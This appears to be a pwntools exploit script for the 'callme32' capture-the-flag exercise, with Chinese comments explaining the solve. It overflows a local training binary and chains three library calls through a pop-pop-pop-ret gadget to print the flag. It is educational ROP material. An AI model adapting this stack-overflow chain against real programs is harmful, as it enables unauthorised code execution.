from pwn import *
#分析 callme32  发现 usefulFunction 中调用反顺序的 callme_one , two , three
#正序调用后 , 输出 incorrect parameters 得知 传入参数错误 
# 分析 libccallme32.so , 改正传入参数为 1 , 2 ,3得到 flag ROPE{a_placeholder_32byte_flag!}

fpath = "./callme32"
offset = 0x28 + 4

p = process(fpath)
elf = ELF(fpath)
p.recv()

if __name__ == '__main__':
	addr_usefulFunction 	= elf.symbols["usefulFunction"]
	addr_callme_one      	= elf.symbols["callme_one"]
	addr_callme_two      	= elf.symbols["callme_two"]
	addr_callme_three   	= elf.symbols["callme_three"]
	addr_pppr             	= 0x080488a9

	payload = offset * 'a' 
	payload += p32(addr_callme_one) + p32(addr_pppr) + p32(1) + p32(2) + p32(3) 
	payload += p32(addr_callme_two)	+ p32(addr_pppr) + p32(1) + p32(2) + p32(3) 
	payload += p32(addr_callme_three) + p32(addr_pppr) +  p32(1) + p32(2) + p32(3) 
	p.sendline(payload) 
	sleep(1)
	print p.recv()